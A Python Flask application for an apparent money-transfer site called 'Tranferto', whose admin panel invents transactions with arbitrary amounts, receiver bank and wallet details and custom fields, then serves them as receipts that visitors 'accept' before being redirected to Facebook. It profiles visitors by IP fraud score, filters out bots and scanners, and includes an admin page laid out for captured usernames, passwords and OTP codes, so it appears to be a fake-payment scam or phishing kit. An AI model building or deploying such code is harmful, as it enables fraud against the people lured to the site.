from flask import Flask, render_template, request, redirect, url_for, session, flash, jsonify, g, send_from_directory
from flask_socketio import SocketIO, emit
from functools import wraps
import os
import csv
import random
import string
from datetime import datetime, timezone, timedelta
import requests
import json
import uuid
import time
from werkzeug.security import check_password_hash, generate_password_hash
from werkzeug.utils import secure_filename
from dotenv import load_dotenv
from antibotspy.flask_antibot import AntiBotMiddleware

# Load environment variables
load_dotenv()

# Initialize Flask app
app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', 'your-secret-key-here')
# Configuration for file uploads
app.config['UPLOAD_FOLDER'] = os.path.join('static', 'uploads', 'receipt_images')
app.config['ALLOWED_EXTENSIONS'] = {'png', 'jpg', 'jpeg', 'gif'}
os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)

# Initialize anti-bot protection with development mode
antibot = AntiBotMiddleware(app)

# Configure anti-bot settings
antibot.strict_mode = False  # Disable strict mode
antibot.rate_limit = 1000  # Increase rate limit significantly for development
antibot.block_duration = 60  # Reduce block duration to 1 minute
antibot.whitelist_paths = [
    # Static files and assets
    '/static/*',
    '/assets/*',
    '/favicon.ico',
    
    # WebSocket endpoints
    '/socket.io/*',
    
    # Main pages
    '/',
    '/about-us',
    '/our-team',
    '/contact',
    '/login',
    '/register',
    '/registered',
    '/privacy-policy',
    '/terms-conditions',
    
    # Admin routes
    '/admin',
    '/admin/login',
    '/admin/panel',
    '/admin/logs',
    '/admin/change-password-page',
    '/admin/change-password',
    '/admin/generate-tracking',
    '/admin/create-transaction',
    '/admin/antibot-stats',
    
    # Transaction routes
    '/track',
    '/receipt/*',
    '/accept-transaction/*',
    '/decline-transaction/*',
    
    # API and utility routes
    '/crypto-ticker.js',
    '/*.png'  # For serving PNG images
]
antibot.debug = True  # Enable debug mode

# Initialize SocketIO after anti-bot configuration
socketio = SocketIO(app, 
                   cors_allowed_origins="*",
                   async_mode='threading',  # Using threading mode for better compatibility
                   ping_timeout=60,
                   ping_interval=25)

# Protected routes that need additional bot protection
PROTECTED_ROUTES = [
    '/admin/login',
    '/admin/panel',
    '/admin/create-transaction',
    '/track',
    '/accept-transaction',
    '/decline-transaction'
]

# Add bot protection to specific routes
# Decorator logic remains the same, using the configured 'antibot' instance
def protect_route_from_bots(route_func):
    @wraps(route_func)
    def wrapper(*args, **kwargs):
        # Get the IP address from the request
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        if ip:
            ip = ip.split(',')[0].strip()
        else:
            ip = request.remote_addr
            
        # Check IP quality score first
        try:
            ipqs_api_key = os.environ.get('IPQS_API_KEY')
            if ipqs_api_key:
                url = f"https://www.ipqualityscore.com/api/json/ip/{ipqs_api_key}/{ip}?strictness=0" # Reduced strictness
                headers = {
                    'Accept': 'application/json',
                    'User-Agent': 'Tranferto/1.0'
                }
                
                response = requests.get(url, headers=headers, timeout=5)
                if response.status_code == 200:
                    data = response.json()
                    if data.get('success', False):
                        fraud_score = data.get('fraud_score', 0)
                        # If fraud score is low, allow the request directly
                        if fraud_score < 85: # Increased threshold
                            return route_func(*args, **kwargs)
                # If API call fails or returns non-200, log it but don't block yet
                elif response.status_code != 200:
                     app.logger.warning(f"IPQS API returned status {response.status_code} for IP {ip}")

            else:
                 app.logger.warning("IPQS_API_KEY not set. Skipping IP quality check.")
                 # If no API key, we can't check score, proceed to antibot middleware protection
                 pass

        except requests.exceptions.RequestException as e:
            app.logger.error(f"IP quality check request failed for IP {ip}: {str(e)}")
            # If the check *itself* fails (e.g., timeout, connection error), allow the request
            # This prevents blocking users due to external API issues.
            return route_func(*args, **kwargs)
        except Exception as e:
            # Catch other potential errors during the check
            app.logger.error(f"Unexpected error during IP quality check for IP {ip}: {str(e)}")
            # Allow request on unexpected errors as well
            return route_func(*args, **kwargs)
            
        # If IPQS check didn't explicitly allow (high fraud score or no API key),
        # fall back to the AntiBotMiddleware's protection mechanisms (rate limiting etc.)
        # The middleware itself will decide whether to block based on its rules.
        return antibot.protect(route_func)(*args, **kwargs)
    return wrapper

# Admin credentials
ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD', 'admin123')
ADMIN_PASSWORD_HASH = generate_password_hash(ADMIN_PASSWORD)

# CSV file paths
VISITORS_CSV = 'data/visitors.csv'
TRANSACTIONS_CSV = 'data/transactions.csv'
VISITS_TXT = 'data/visits.txt'

# Updated CSV Headers
TRANSACTION_FIELDNAMES = [
    'id', 'transaction_id', 'operation_date', 'payment_method',
    'amount', 'status', 'receiver_mode', 'receiver_email', 'receiver_name',
    'receiver_account', 'account_name', 'receiver_wallet', 'wallet_name',
    'receiver_network', 'receiver_memo', 'bank_name', 'account_number', 'purpose',
    'created_at', 'profile_pic_filename', 'profile_name', 'profile_link',
    'custom_title_1', 'custom_value_1', 'custom_title_2', 'custom_value_2',
    'custom_title_3', 'custom_value_3', 'custom_title_4', 'custom_value_4',
    'custom_title_5', 'custom_value_5'
]

# Create data directory if it doesn't exist
os.makedirs('data', exist_ok=True)

# Create CSV files if they don't exist
def init_csv_files():
    if not os.path.exists(VISITORS_CSV):
        with open(VISITORS_CSV, 'w', newline='') as f:
            writer = csv.writer(f)
            writer.writerow(['ip_address', 'page', 'timestamp', 'fraud_score', 'country_code'])
    
    if not os.path.exists(TRANSACTIONS_CSV):
        with open(TRANSACTIONS_CSV, 'w', newline='') as f:
            writer = csv.DictWriter(f, fieldnames=TRANSACTION_FIELDNAMES)
            writer.writeheader()
    else:
        # Check if header needs updating (simple check based on first line)
        needs_update = False
        try:
            with open(TRANSACTIONS_CSV, 'r', newline='') as f:
                header = f.readline().strip().split(',')
                if header != TRANSACTION_FIELDNAMES:
                    needs_update = True
        except Exception:
            needs_update = True # Error reading, assume needs update

        if needs_update:
            # Read existing data
            transactions = []
            try:
                with open(TRANSACTIONS_CSV, 'r', newline='') as f:
                    # Use existing header to read if possible
                    reader = csv.DictReader(f)
                    current_fieldnames = reader.fieldnames or [] # Handle empty file
                    for row in reader:
                        # Add missing fields with default value
                        for field in TRANSACTION_FIELDNAMES:
                            row.setdefault(field, '') # Use empty string or 'N/A'
                        # Remove fields no longer present (like confirmation_code)
                        keys_to_remove = [k for k in row if k not in TRANSACTION_FIELDNAMES]
                        for k in keys_to_remove:
                            del row[k]
                        transactions.append(row)
            except Exception as e:
                print(f"Warning: Could not properly migrate CSV: {e}")
                # Optionally handle backup or error reporting here

            # Write back with new header and potentially modified data
            try:
                with open(TRANSACTIONS_CSV, 'w', newline='') as f:
                    writer = csv.DictWriter(f, fieldnames=TRANSACTION_FIELDNAMES)
                    writer.writeheader()
                    writer.writerows(transactions)
                print("CSV header updated successfully.")
            except Exception as e:
                print(f"Error writing updated CSV: {e}")

init_csv_files()

# Global variable to store active visitors
active_visitors = {}

# Helper functions
def get_visitor_country(ip):
    try:
        # Use IPQualityScore API instead of ip-api.com for consistency
        ipqs_api_key = os.environ.get('IPQS_API_KEY')
        if not ipqs_api_key:
            return 'Unknown', 'XX'
            
        url = f"https://www.ipqualityscore.com/api/json/ip/{ipqs_api_key}/{ip}?strictness=1&allow_public_access_points=true"
        headers = {
            'Accept': 'application/json',
            'User-Agent': 'Tranferto/1.0'
        }
        
        response = requests.get(url, headers=headers, timeout=5)
        if response.status_code == 200:
            data = response.json()
            if data.get('success', False):
                return data.get('country', 'Unknown'), data.get('country_code', 'XX')
    except:
        pass
    return 'Unknown', 'XX'

def get_next_id(csv_file):
    try:
        with open(csv_file, 'r', newline='') as f:
            reader = csv.reader(f)
            next(reader)  # Skip header
            return max(int(row[0]) for row in reader if row[0].isdigit()) + 1
    except:
        return 1

# Login required decorator
def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'admin_logged_in' not in session:
            return redirect(url_for('admin_login'))
        return f(*args, **kwargs)
    return decorated_function

@app.before_request
def track_visitor():
    if request.path.startswith('/admin') or request.path.startswith('/static'):
        return
    
    # Get the real IP address, considering localhost and proxies
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ip:
        ip = ip.split(',')[0].strip()
    else:
        ip = request.remote_addr
        
    # For localhost testing, use the actual localhost IP
    if ip in ['127.0.0.1', 'localhost', '::1']:
        ip = '127.0.0.1'  # Use actual localhost IP
    
    page = request.path
    timestamp = datetime.now(timezone.utc).isoformat()
    
    # Increment total visits
    try:
        with open(VISITS_TXT, "r+") as f:
            visits = int(f.read().strip()) + 1
            f.seek(0)
            f.write(str(visits))
    except:
        with open(VISITS_TXT, "w") as f:
            f.write("1")
    
    # Get IP quality score
    fraud_score = 0
    country_code = 'Unknown'
    
    try:
        ipqs_api_key = os.environ.get('IPQS_API_KEY')
        if not ipqs_api_key:
            app.logger.warning("IPQS_API_KEY not found in environment variables")
            # For localhost testing without API key, use mock data
            if ip == '8.8.8.8':
                country_code = 'US'
                fraud_score = 0
            elif ip == '2.2.2.2':
                country_code = 'FR'
                fraud_score = 0
            elif ip == '1.1.1.1':
                country_code = 'AU'
                fraud_score = 0
        else:
            app.logger.info(f"Checking IP {ip} with IPQS API")
            url = f"https://www.ipqualityscore.com/api/json/ip/{ipqs_api_key}/{ip}?strictness=1&allow_public_access_points=true"
            headers = {
                'Accept': 'application/json',
                'User-Agent': 'Tranferto/1.0'
            }
            
            response = requests.get(url, headers=headers, timeout=5)
            app.logger.info(f"IPQS API Response Status: {response.status_code}")
            
            if response.status_code == 200:
                data = response.json()
                if data.get('success', False):
                    country_code = data.get('country_code', 'Unknown')
                    fraud_score = data.get('fraud_score', 0)
                    app.logger.info(f"IP {ip} - Country: {country_code}, Fraud Score: {fraud_score}")
    except Exception as e:
        app.logger.error(f"Error checking IP {ip}: {str(e)}")
        # Use backup IP geolocation service for localhost testing
        try:
            response = requests.get(f'http://ip-api.com/json/{ip}')
            if response.status_code == 200:
                data = response.json()
                country_code = data.get('countryCode', 'Unknown')
                fraud_score = 0  # Default to 0 for backup service
        except:
            pass
    
    # Update visitors.csv with the new format
    visitors = []
    try:
        with open(VISITORS_CSV, "r") as f:
            reader = csv.DictReader(f)
            visitors = list(reader)
    except:
        pass
    
    visitor_exists = False
    for visitor in visitors:
        if visitor.get("ip_address") == ip:
            visitor["page"] = page
            visitor["timestamp"] = timestamp
            visitor["fraud_score"] = str(fraud_score)
            visitor["country_code"] = country_code
            visitor_exists = True
            break
    
    if not visitor_exists:
        visitors.append({
            "ip_address": ip,
            "page": page,
            "timestamp": timestamp,
            "fraud_score": str(fraud_score),
            "country_code": country_code
        })
    
    # Keep only recent visitors (last 5 minutes)
    current_time = datetime.now(timezone.utc)
    visitors = [
        v for v in visitors
        if v.get("timestamp") and
        (current_time - datetime.fromisoformat(v["timestamp"])).total_seconds() < 300
    ]
    
    # Write updated visitors list
    with open(VISITORS_CSV, "w", newline='') as f:
        writer = csv.DictWriter(f, fieldnames=["ip_address", "page", "timestamp", "fraud_score", "country_code"])
        writer.writeheader()
        writer.writerows(visitors)
    
    visitor_data = {
        'ip_address': ip,
        'page': page,
        'timestamp': timestamp,
        'fraud_score': str(fraud_score),
        'country_code': country_code,
        'last_activity': datetime.now(timezone.utc).isoformat()
    }
    
    # Update active visitors
    active_visitors[ip] = visitor_data
    
    # Emit update to all admin panels
    if 'admin_logged_in' in session:
        socketio.emit('visitor_update', {
            'visitor': visitor_data,
            'live_visitors': len(active_visitors)
        })
    
    # Clean up old visitors (inactive for more than 5 minutes)
    cleanup_visitors()
    
    g.visitor_data = visitor_data

def cleanup_visitors():
    current_time = datetime.now(timezone.utc)
    expired_ips = []
    
    for ip, data in active_visitors.items():
        last_activity_str = data.get('last_activity')
        if last_activity_str:
            try:
                last_activity = datetime.fromisoformat(last_activity_str)
                if (current_time - last_activity) > timedelta(minutes=1):  # Reduced to 1 minute for faster cleanup
                    expired_ips.append(ip)
            except ValueError:
                # If there's an error parsing the datetime, remove the visitor
                expired_ips.append(ip)
    
    for ip in expired_ips:
        del active_visitors[ip]
        if 'admin_logged_in' in session:
            socketio.emit('visitor_left', {'ip_address': ip})
            socketio.emit('visitor_count', {'count': len(active_visitors)})

# SocketIO events
@socketio.on('connect')
def handle_connect():
    if 'admin_logged_in' in session:
        # Send initial visitor data
        for ip, visitor in active_visitors.items():
            emit('visitor_update', {
                'visitor': visitor,
                'live_visitors': len(active_visitors)
            })

@socketio.on('disconnect')
def handle_disconnect():
    # Get the IP address from the request
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ip:
        ip = ip.split(',')[0].strip()
    else:
        ip = request.remote_addr
    
    # Remove the visitor from active_visitors
    if ip in active_visitors:
        del active_visitors[ip]
        if 'admin_logged_in' in session:
            socketio.emit('visitor_left', {'ip_address': ip})
            socketio.emit('visitor_count', {'count': len(active_visitors)})

@socketio.on('ping')
def handle_ping():
    # Get the IP address from the request
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ip:
        ip = ip.split(',')[0].strip()
    else:
        ip = request.remote_addr
    
    # Update last activity for the visitor
    if ip in active_visitors:
        active_visitors[ip]['last_activity'] = datetime.now(timezone.utc).isoformat()
        emit('pong')

# Serve static files from the assets directory
@app.route('/assets/<path:filename>')
def serve_assets(filename):
    return send_from_directory('static/assets', filename)

# Main routes
@protect_route_from_bots
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/about-us')
def about_us():
    return render_template('about-us.html')

@app.route('/our-team')
def our_team():
    return render_template('our-team.html')

@app.route('/contact')
def contact():
    return render_template('contact.html')

@app.route('/login')
def login():
    return render_template('login-2.html')

@app.route('/register')
def register():
    return render_template('register-2.html')

@app.route('/registered')
def registered():
    return render_template('registered.html')

@app.route('/privacy-policy')
def privacy_policy():
    return render_template('privacy-policy.html')

@app.route('/terms-conditions')
def terms_conditions():
    return render_template('terms-conditions.html')

# HTML extension redirects for compatibility with old links
@app.route('/about-us.html')
def about_us_html():
    return redirect(url_for('about_us'))

@app.route('/our-team.html')
def our_team_html():
    return redirect(url_for('our_team'))

@app.route('/contact.html')
def contact_html():
    return redirect(url_for('contact'))

@app.route('/login-2.html')
def login_html():
    return redirect(url_for('login'))

@app.route('/register-2.html')
def register_html():
    return redirect(url_for('register'))

@app.route('/privacy-policy.html')
def privacy_policy_html():
    return redirect(url_for('privacy_policy'))

@app.route('/terms-conditions.html')
def terms_conditions_html():
    return redirect(url_for('terms_conditions'))

@app.route('/index.html')
def index_html():
    return redirect(url_for('index'))

# Admin routes
@app.route('/admin/login', methods=['GET', 'POST'])
def admin_login():
    try:
        if request.method == 'POST':
            password = request.form.get('password')
            if not password:
                flash('Please enter a password', 'error')
                return render_template('admin-login.html')
                
            if check_password_hash(ADMIN_PASSWORD_HASH, password):
                session['admin_logged_in'] = True
                flash('Successfully logged in!', 'success')
                return redirect(url_for('admin_dashboard'))
            else:
                flash('Invalid password. Please try again.', 'error')
                return render_template('admin-login.html')
                
        return render_template('admin-login.html')
    except Exception as e:
        app.logger.error(f"Error in admin login: {str(e)}")
        flash('An error occurred. Please try again.', 'error')
        return render_template('admin-login.html')

@app.route('/admin/logout')
def admin_logout():
    session.pop('admin_logged_in', None)
    flash('Successfully logged out!', 'success')
    return redirect(url_for('admin_login'))

@app.route('/admin/panel')
@login_required
def admin_panel():
    try:
        # Clean up old visitors before displaying
        cleanup_visitors()
        
        # Calculate stats
        live_visitors = len(active_visitors)
        banned_bots = sum(1 for v in active_visitors.values() if int(v.get('fraud_score', 0)) >= 75)
        
        total_visits = 0
        try:
            with open(VISITS_TXT, 'r') as f:
                total_visits = int(f.read().strip())
        except Exception as e:
            app.logger.error(f"Error reading total visits: {str(e)}")
            flash(f'Error reading total visits file: {e}', 'error')
        
        # Get transactions
        transactions = []
        try:
            with open(TRANSACTIONS_CSV, 'r', newline='') as f:
                reader = csv.DictReader(f)
                transactions = list(reader)
                for transaction in transactions:
                    for key in transaction:
                        if transaction[key] is None or transaction[key] == '':
                            transaction[key] = 'N/A'
                    if 'status' not in transaction or not transaction['status']:
                        transaction['status'] = 'Processing'
        except Exception as e:
            app.logger.error(f"Error reading transactions: {str(e)}")
            flash(f'Error reading transactions file: {e}', 'error')
        
        return render_template('admin-panel.html',
                             total_visits=total_visits,
                             live_visitors=live_visitors,
                             banned_bots=banned_bots,
                             transactions=transactions,
                             recent_visitors=list(active_visitors.values()))
    except Exception as e:
        app.logger.error(f"Error in admin panel: {str(e)}")
        flash('An error occurred while loading the admin panel.', 'error')
        return redirect(url_for('admin_login'))

@app.route('/admin/logs')
@login_required
def admin_logs():
    # Placeholder for fetching log data - you'll need to implement this
    # based on how you store user login attempts, OTPs, etc.
    # For now, using dummy data
    logs_data = [
        {'username': 'user1', 'password_attempt': '****', 'otp_attempt': '123456', 'ip': '192.168.1.1', 'timestamp': datetime.now(timezone.utc).isoformat()},
        {'username': 'user2', 'password_attempt': '****', 'otp_attempt': '987654', 'ip': '10.0.0.5', 'timestamp': datetime.now(timezone.utc).isoformat()},
        # Add more example log entries
    ]
    return render_template('admin-logs.html', logs=logs_data)

@app.route('/admin/change-password-page', endpoint='admin_change_password_page')
@login_required
def admin_change_password_page_get():
    return render_template('admin-change-password.html')

@app.route('/admin')
@login_required
def admin_dashboard():
    return redirect(url_for('admin_panel'))

@app.route('/admin/generate-tracking', methods=['POST'])
@login_required
def generate_tracking():
    tracking_number = generate_tracking_number()
    return jsonify({'tracking_number': tracking_number})

@app.route('/admin/create-transaction', methods=['GET', 'POST'])
@login_required
def admin_create_transaction():
    try:
        if request.method == 'POST':
            data = request.form
            profile_pic_filename = None

            # Handle file upload
            if 'profile_pic' in request.files:
                file = request.files['profile_pic']
                if file and file.filename != '' and allowed_file(file.filename):
                    filename = secure_filename(file.filename)
                    unique_filename = f"{uuid.uuid4()}_{filename}"
                    file.save(os.path.join(app.config['UPLOAD_FOLDER'], unique_filename))
                    profile_pic_filename = unique_filename
                elif file.filename != '':
                    flash('Invalid file type for profile picture. Allowed types: png, jpg, jpeg, gif', 'error')
                    return redirect(url_for('admin_create_transaction'))

            transaction_id = generate_transaction_id()

            transaction = {
                'id': get_next_id(TRANSACTIONS_CSV),
                'transaction_id': transaction_id,
                'operation_date': datetime.now(timezone.utc).isoformat(),
                'payment_method': data.get('payment_method', ''),
                'amount': data.get('amount', '0'),
                'status': 'Waiting for Receiver Confirmation',
                'receiver_mode': data.get('receiver_mode', 'email'),
                'receiver_email': data.get('receiver_email', ''),
                'receiver_name': data.get('receiver_name', ''),
                'receiver_account': data.get('receiver_account', ''),
                'account_name': data.get('account_name', ''),
                'receiver_wallet': data.get('receiver_wallet', ''),
                'wallet_name': data.get('wallet_name', ''),
                'receiver_network': data.get('receiver_network', ''),
                'receiver_memo': data.get('receiver_memo', ''),
                'bank_name': data.get('bank_name', ''),
                'account_number': data.get('account_number', ''),
                'purpose': data.get('purpose', ''),
                'created_at': datetime.now(timezone.utc).isoformat(),
                'profile_pic_filename': profile_pic_filename,
                'profile_name': data.get('profile_name', ''),
                'profile_link': data.get('profile_link', ''),
                'custom_title_1': data.get('custom_title_1', ''),
                'custom_value_1': data.get('custom_value_1', ''),
                'custom_title_2': data.get('custom_title_2', ''),
                'custom_value_2': data.get('custom_value_2', ''),
                'custom_title_3': data.get('custom_title_3', ''),
                'custom_value_3': data.get('custom_value_3', ''),
                'custom_title_4': data.get('custom_title_4', ''),
                'custom_value_4': data.get('custom_value_4', ''),
                'custom_title_5': data.get('custom_title_5', ''),
                'custom_value_5': data.get('custom_value_5', '')
            }

            # Write to CSV file
            with open(TRANSACTIONS_CSV, 'a', newline='') as f:
                writer = csv.DictWriter(f, fieldnames=TRANSACTION_FIELDNAMES)
                # Check if file is empty to write header
                f.seek(0, os.SEEK_END) # Go to end of file
                if f.tell() == 0:
                    writer.writeheader()
                writer.writerow(transaction)

            flash(f'Transaction created successfully! ID: {transaction_id}', 'success')
            return redirect(url_for('admin_panel'))
        else:
            # GET request - show the form
            return render_template('admin-create-transaction.html')
            
    except Exception as e:
        app.logger.error(f"Error in create transaction: {str(e)}")
        flash(f'Error creating transaction: {str(e)}', 'error')
        return redirect(url_for('admin_create_transaction'))

@app.route('/track', methods=['POST'])
def track_transfer():
    try:
        transaction_code = request.form.get('transaction_code')
        
        # Validate transaction code format
        if not transaction_code or len(transaction_code) != 8:
            flash('Invalid transaction code format. Please enter an 8-character code.', 'error')
            return redirect(url_for('index'))
            
        # Read transactions from CSV
        transaction = None
        if os.path.exists(TRANSACTIONS_CSV):
            with open(TRANSACTIONS_CSV, 'r', newline='') as f:
                reader = csv.DictReader(f)
                for row in reader:
                    if row.get('transaction_id') == transaction_code:
                        transaction = row
                        break
        
        if not transaction:
            flash('No transaction found with this code. Please check and try again.', 'error')
            return redirect(url_for('index'))
            
        return redirect(url_for('receipt', transaction_id=transaction_code))
        
    except Exception as e:
        app.logger.error(f"Error tracking transfer: {str(e)}")
        flash('An error occurred while processing your request. Please try again.', 'error')
        return redirect(url_for('index'))

@app.route('/accept-transaction/<transaction_id>', methods=['POST'])
@protect_route_from_bots
def accept_transaction(transaction_id):
    try:
        transactions = []
        if os.path.exists(TRANSACTIONS_CSV):
            with open(TRANSACTIONS_CSV, 'r', newline='') as f:
                reader = csv.DictReader(f)
                transactions = list(reader)
        
        updated = False
        for txn in transactions:
            if txn['transaction_id'] == transaction_id:
                txn['status'] = 'Completed'
                updated = True
                break
        
        if updated:
            with open(TRANSACTIONS_CSV, 'w', newline='') as f:
                writer = csv.DictWriter(f, fieldnames=TRANSACTION_FIELDNAMES)
                writer.writeheader()
                writer.writerows(transactions)
            # Optionally flash a success message before redirecting
            # flash('Transaction accepted!', 'success') 
            return redirect('https://facebook.com') # Redirect as originally intended
        else:
            flash('Transaction not found.', 'error')
            # Redirect back to receipt page or index
            return redirect(url_for('receipt', transaction_id=transaction_id))
            
    except Exception as e:
        flash(f'Error accepting transaction: {str(e)}', 'error')
        app.logger.error(f"Error accepting transaction: {e}", exc_info=True)
        return redirect(url_for('index'))

@app.route('/decline-transaction/<transaction_id>', methods=['POST'])
@protect_route_from_bots
def decline_transaction(transaction_id):
    try:
        transactions = []
        if os.path.exists(TRANSACTIONS_CSV):
            with open(TRANSACTIONS_CSV, 'r', newline='') as f:
                reader = csv.DictReader(f)
                transactions = list(reader)
        
        updated = False
        for txn in transactions:
            if txn['transaction_id'] == transaction_id:
                txn['status'] = 'Declined'
                updated = True
                break
        
        if updated:
            with open(TRANSACTIONS_CSV, 'w', newline='') as f:
                writer = csv.DictWriter(f, fieldnames=TRANSACTION_FIELDNAMES)
                writer.writeheader()
                writer.writerows(transactions)
            # Optionally flash a success message before redirecting
            # flash('Transaction declined!', 'success') 
            return redirect('https://facebook.com') # Redirect as originally intended
        else:
            flash('Transaction not found.', 'error')
            # Redirect back to receipt page or index
            return redirect(url_for('receipt', transaction_id=transaction_id))
            
    except Exception as e:
        flash(f'Error declining transaction: {str(e)}', 'error')
        app.logger.error(f"Error declining transaction: {e}", exc_info=True)
        return redirect(url_for('index'))

@app.route('/receipt/<transaction_id>')
def receipt(transaction_id):
    if not transaction_id or len(transaction_id) != 8:
        flash('Invalid transaction code format.', 'error')
        return redirect(url_for('index'))

    try:
        transaction = None
        if os.path.exists(TRANSACTIONS_CSV):
            with open(TRANSACTIONS_CSV, 'r', newline='') as f:
                reader = csv.DictReader(f) # Let DictReader handle fieldnames from header
                for row in reader:
                    if row.get('transaction_id') == transaction_id:
                        transaction = row
                        # Ensure all expected fields exist, providing defaults if missing
                        for key in TRANSACTION_FIELDNAMES:
                            transaction.setdefault(key, '') # Use empty string or 'N/A'
                        break

        if not transaction:
            flash('No transaction found with this code.', 'error')
            return redirect(url_for('index'))

        return render_template('receipt.html', transaction=transaction)

    except Exception as e:
        flash(f'Error processing transaction: {str(e)}', 'error')
        app.logger.error(f"Error processing transaction: {e}", exc_info=True)
        return redirect(url_for('index'))

# Password change function
def update_admin_password(current_password, new_password, confirm_password):
    global ADMIN_PASSWORD_HASH
    
    if not check_password_hash(ADMIN_PASSWORD_HASH, current_password):
        return False, 'Current password is incorrect.'
    elif new_password != confirm_password:
        return False, 'New passwords do not match.'
    elif len(new_password) < 8:
        return False, 'New password must be at least 8 characters long'
    
    try:
        # Read all environment variables from .env
        env_vars = {}
        if os.path.exists('.env'):
            with open('.env', 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        key, value = line.split('=', 1)
                        env_vars[key.strip()] = value.strip()
        
        # Update the password
        env_vars['ADMIN_PASSWORD'] = new_password
        
        # Write back to .env file
        with open('.env', 'w') as f:
            for key, value in env_vars.items():
                f.write(f"{key}={value}\n")
        
        # Update in-memory values
        os.environ['ADMIN_PASSWORD'] = new_password
        ADMIN_PASSWORD_HASH = generate_password_hash(new_password)
        
        return True, 'Password updated successfully!'
    except Exception as e:
        app.logger.error(f"Error updating password: {e}")
        return False, 'Error updating password. Please try again.'

@app.route('/admin/change-password', methods=['POST'])
@login_required
def change_password():
    current_password = request.form.get('current_password')
    new_password = request.form.get('new_password')
    confirm_password = request.form.get('confirm_password')
    
    success, message = update_admin_password(current_password, new_password, confirm_password)
    flash(message, 'success' if success else 'error')
    return redirect(url_for('admin_dashboard'))

# Serve image files
@app.route('/<path:filename>.png')
def serve_png(filename):
    return send_from_directory('static/img', f'{filename}.png')

@app.route('/crypto-ticker.js')
def serve_crypto_ticker():
    return send_from_directory('static/js', 'crypto-ticker.js')

# Helper function to check allowed file extensions
def allowed_file(filename):
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in app.config['ALLOWED_EXTENSIONS']

# Helper function to generate new Transaction ID (7 digits + 1 letter)
def generate_transaction_id():
    digits = ''.join(random.choices(string.digits, k=7))
    letter = random.choice(string.ascii_uppercase)
    id_list = list(digits + letter)
    random.shuffle(id_list)
    return ''.join(id_list)

# Add antibot statistics endpoint
@app.route('/admin/antibot-stats')
@login_required
def antibot_stats():
    # Read the last 50 lines from the antibot log
    log_entries = []
    try:
        with open('antibot.log', 'r') as f:
            log_entries = f.readlines()[-50:]
    except Exception as e:
        log_entries = [f"Error reading log: {str(e)}"]

    stats = {
        'blocked_requests': antibot.detector.get_block_count(),
        'cached_ips': antibot.detector.get_cache_size(),
        'recent_logs': log_entries
    }
    
    return render_template(
        'antibot_stats.html',
        stats=stats,
        title='Anti-Bot Statistics'
    )

if __name__ == '__main__':
    socketio.run(app, debug=True) 